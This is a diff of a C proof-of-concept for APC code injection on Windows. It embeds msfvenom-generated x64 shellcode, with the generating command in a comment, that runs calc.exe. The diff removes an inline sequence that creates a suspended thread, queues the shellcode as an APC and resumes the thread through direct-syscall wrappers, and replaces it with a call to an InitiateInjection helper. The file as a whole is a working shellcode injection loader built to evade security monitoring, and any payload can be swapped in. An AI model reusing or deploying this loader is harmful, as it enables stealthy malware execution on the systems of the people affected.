@@ -5,10 +5,6 @@
 // POC for testing APC injection
 int main()
 {
-	HANDLE hThread = NULL;
-	HANDLE hProcess = GetCurrentProcess();
-	NTSTATUS STATUS = NULL;
-
 	// msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.exe -f c -exitfunc thread
 	unsigned char pPayload[] =
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
@@ -32,40 +28,11 @@ int main()
 		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-
 	SIZE_T sSize = sizeof(pPayload);
 
-	if ((STATUS = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)RandomFunction, NULL, TRUE, NULL, NULL, NULL, NULL)) != 0)
+	if (InitiateInjection(pPayload,sSize))
 	{
-		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
-		goto _Cleanup;
+		return -1;
 	}
-
-	printf("[*] Suspended thread has been created with address 0x%p\n", hThread);
-
-	// Queuing the payload into APC
-	if (!ApcInjectionViaSyscalls(hProcess, hThread, pPayload, sSize))
-	{
-		printf("[!] APC Injection via Syscalls failed! \n");
-		goto _Cleanup;
-	}
-
-	printf("[*] Resuming Thread ...\n");
-
-	if ((STATUS = Sw3NtResumeThread(hThread, NULL)) != 0)
-	{
-		printf("[!] NtResumeThread Failed With Error : 0x%0.8X \n", STATUS);
-		goto _Cleanup;
-	}
-
-	if ((STATUS = Sw3NtWaitForSingleObject(hThread, TRUE, NULL)) != 0)
-	{
-		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
-		goto _Cleanup;
-	}
-
-	return TRUE;
-
-_Cleanup:
-	return FALSE;
+	return 0;
 }
